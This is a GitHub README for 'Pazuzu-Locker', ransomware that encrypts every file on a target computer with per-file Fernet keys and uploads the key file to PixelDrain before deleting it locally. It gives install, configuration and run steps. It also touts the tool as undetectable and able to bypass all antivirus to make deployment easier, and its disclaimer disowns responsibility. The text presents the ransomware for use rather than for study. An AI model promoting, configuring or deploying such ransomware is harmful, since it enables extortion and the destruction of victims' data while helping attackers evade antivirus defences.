![banner](https://github.com/natekali/Pazuzu-Locker/assets/117448792/a530e303-9b3b-4c1d-87c9-290544ecb1c3)

# Pazuzu-Locker 👿
Brand new Crypto-Locker made using **Fernet** encryption method, an **automatic parser** go through all the files of the computer target, for **each files**, a **new encryption key** is used, making the forensics investigations **harder**, even **impossible**. At the end of the execution, a **csv file** is created, uploaded to PixelDrain and deleted from the computer. The **only way to decrypt** files is to have the PixelDrain **file ID** necessary to run the `decrypt.py` program. **Pazuzu is 100% automatic**, only changes needed to run properly can be done through `conf.py` file

## ⛔️ Disclaimer 
I made this software, and **I'm not responsible** for what you do with it or any problems it causes. **By using it, you agree to this rule.**

## 🐉 Features
* **100% Automatic & 100% Undetectable**
* **Encryption Method Unreversible**
* **Error Handled for Persistent Execution**
* **Comprehensive & Easy Usage**
 
## ℹ️ Prerequisites
Before running Pazuzu, make sure you install these following libraries :
* requests
* cryptography

You can install them by typing this following command in your terminal :  
`pip3 install -r requirements.txt`

## 🛠️ Installation

Clone this repository to your local machine.

Open your terminal and navigate to the cloned repository.

Edit the `config.py` file, to encrypt you must change `start_dir` & `tmp_csv` values, to decrypt you must change `pxfile_id` value.

To encrypt, run the script by typing `python3 pazuzu.py` in your terminal. To decrypt, type `python3 decrypt.py`in your terminal.

## 🐝 VirusTotal Check
**Pazuzu Locker** can easily **bypass all known antivirus**, making it **easier** to deploy
![VT_check](https://github.com/natekali/Pazuzu-Locker/assets/117448792/d336c9b5-3cda-42d4-a506-093bc92cecbc)

## 👽 Usage demo
**Default usage** of **`Pazuzu Locker`** from encryption to decryption on sample directory, `conf.py` used for demo : 
```
param = {
    'start_dir': '/home/pazuzu/sample',
    'tmp_csv': 'tmp.csv',
    'pxfile_id': 'FPJZjoAd'
}
```
https://github.com/natekali/Pazuzu-Locker/assets/117448792/907bc3d3-dd11-46af-90dd-7508beb019a8

## 💼 Author
* [@natekali](https://github.com/natekali)
